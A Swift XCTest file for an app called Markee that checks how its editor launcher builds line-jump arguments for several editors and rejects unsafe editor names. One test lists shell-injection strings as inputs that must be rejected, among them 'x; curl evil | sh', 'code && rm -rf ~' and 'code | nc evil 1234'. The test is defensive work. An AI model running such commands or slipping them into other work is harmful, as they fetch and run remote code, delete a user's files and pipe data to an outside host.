import XCTest
@testable import Markee

final class EditorLauncherTests: XCTestCase {
    func test_buildArgs_vscodeFamily_usesDashG() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "code", file: "/x/y.md", line: 41),
            ["-g", "/x/y.md:42:1"]
        )
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "/opt/homebrew/bin/cursor", file: "/x.md", line: 0),
            ["-g", "/x.md:1:1"]
        )
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "code-insiders", file: "/x.md", line: nil),
            ["/x.md"]
        )
    }

    func test_buildArgs_zed_appendsColonLineColon1() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "zed", file: "/x.md", line: 9),
            ["/x.md:10:1"]
        )
    }

    func test_buildArgs_sublAndHelix_appendColonLine() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "subl", file: "/x.md", line: 4),
            ["/x.md:5"]
        )
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "hx", file: "/x.md", line: 4),
            ["/x.md:5"]
        )
    }

    func test_buildArgs_textmate_usesDashLBeforePath() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "mate", file: "/x.md", line: 99),
            ["-l", "100", "/x.md"]
        )
    }

    func test_buildArgs_vimFamily_usesPlusLine() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "mvim", file: "/x.md", line: 12),
            ["+13", "/x.md"]
        )
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "nvim", file: "/x.md", line: nil),
            ["/x.md"]
        )
    }

    func test_buildArgs_unknownEditor_fallsBackToPathOnly() {
        XCTAssertEqual(
            EditorLauncher.buildArgs(editor: "totally-made-up", file: "/x.md", line: 3),
            ["/x.md"]
        )
    }

    /// Negative / zero line shouldn't produce a `:0` jump — clamp to "no line".
    func test_buildArgs_nilLine_omitsLineSuffix() {
        let args = EditorLauncher.buildArgs(editor: "zed", file: "/x.md", line: nil)
        XCTAssertEqual(args, ["/x.md"])
    }

    // MARK: - Override-name validation (shell-injection defense)

    func test_isSafeEditorName_acceptsAllBuiltInCandidates() {
        for name in EditorLauncher.candidates {
            XCTAssertTrue(EditorLauncher.isSafeEditorName(name),
                          "Built-in candidate \(name) must pass safety check")
        }
    }

    func test_isSafeEditorName_rejectsShellMetacharacters() {
        let attacks = [
            "x; curl evil | sh",
            "code && rm -rf ~",
            "$(curl evil)",
            "`whoami`",
            "code | nc evil 1234",
            "code > /tmp/pwn",
            "code\nrm -rf ~",
            "x with spaces",
            "code\"injected",
            "code'injected",
            "../../../bin/bad",
            "code$IFS",
        ]
        for attack in attacks {
            XCTAssertFalse(EditorLauncher.isSafeEditorName(attack),
                           "Should reject shell-unsafe name: \(attack)")
        }
    }

    func test_resolveBinary_rejectsUnsafeName() {
        XCTAssertNil(EditorLauncher.resolveBinary("x; echo pwned"))
        XCTAssertNil(EditorLauncher.resolveBinary("$(uname)"))
    }
}
